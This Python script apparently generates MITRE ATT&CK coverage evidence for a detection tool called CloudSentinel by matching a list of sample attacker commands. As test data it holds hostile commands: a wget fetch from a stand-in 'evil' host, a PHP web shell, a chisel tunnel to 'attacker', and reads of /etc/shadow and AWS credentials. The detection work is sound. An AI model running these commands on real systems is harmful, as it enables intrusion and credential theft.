#!/usr/bin/env python3
"""Generate MITRE ATT&CK coverage evidence for Phase 1."""

from __future__ import annotations

import argparse
import json
from pathlib import Path

from .mitre import MITRE_TECHNIQUES, match_command

COMMANDS = [
    "wget http://evil/bot.sh",
    "bash -c id",
    "python3 -c 'print(1)'",
    "perl -e 'print 1'",
    "chmod 777 bot.sh",
    "chown root:root bot.sh",
    "uname -a",
    "cat /etc/os-release",
    "ps aux",
    "whoami && id",
    "cat /etc/passwd",
    "ss -antp",
    "cat /etc/shadow",
    "iptables -F INPUT",
    "ssh root@10.0.0.5 -p 2222",
    "systemctl enable bot.service",
    "./xmrig --config x",
    "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
    "chisel client attacker:9000 R:socks",
    "powershell -enc SQBFAFgA",
    "cmd.exe /c whoami",
    "openssl enc -aes-256-cbc -in data -out data.locked",
    "cat /root/.aws/credentials",
    "nc -l -p 4444",
]


def main() -> None:
    parser = argparse.ArgumentParser(description="Produce MITRE TTP coverage evidence")
    parser.add_argument("--artifacts-dir", default="artifacts")
    args = parser.parse_args()

    mapped: dict[str, list[str]] = {}
    for command in COMMANDS:
        for technique, _score, _name in match_command(command):
            mapped.setdefault(technique, []).append(command)

    report = {
        "technique_catalog_count": len(MITRE_TECHNIQUES),
        "command_mapped_count": len(mapped),
        "pass": len(mapped) >= 15,
        "mapped": mapped,
    }
    artifacts_dir = Path(args.artifacts_dir)
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    (artifacts_dir / "ttp-coverage.json").write_text(
        json.dumps(report, indent=2, sort_keys=True),
        encoding="utf-8",
    )
    lines = [
        "# CloudSentinel MITRE Coverage",
        "",
        f"- Catalog techniques: {report['technique_catalog_count']}",
        f"- Command-mapped techniques: {report['command_mapped_count']}",
        f"- Result: {'PASS' if report['pass'] else 'FAIL'}",
    ]
    for technique in sorted(mapped):
        info = MITRE_TECHNIQUES.get(technique, {})
        lines.append(f"- {technique}: {info.get('name', technique)}")
    (artifacts_dir / "ttp-coverage.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(json.dumps(report, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
